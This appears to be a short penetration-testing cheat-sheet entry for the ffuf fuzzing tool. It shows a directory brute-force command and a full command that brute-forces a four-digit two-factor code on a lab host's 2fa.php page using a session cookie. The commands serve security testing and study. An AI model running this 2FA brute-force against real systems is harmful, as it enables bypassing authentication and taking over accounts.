### FFUF



Brute-force directories/files with specific extensions

```
ffuf -u <URL/FUZZ> -w <wordlist> -e <ext>
```

2FA /POST Bruteforce with FFUF exemple :

```
ffuf -v -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http://192.168.236.110/2fa.php -X POST \
     -H "Host: 192.168.236.110" \
     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" \
     -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
     -H "Accept-Language: en-US,en;q=0.5" \
     -H "Accept-Encoding: gzip, deflate, br" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -H "Origin: http://192.168.236.110" \
     -H "Referer: http://192.168.236.110/2fa.php" \
     -H "Cookie: PHPSESSID=sodtq3hkqpjf00lb9lktfigse9" \
     -d "2fa_code=FUZZ"
```



```

```

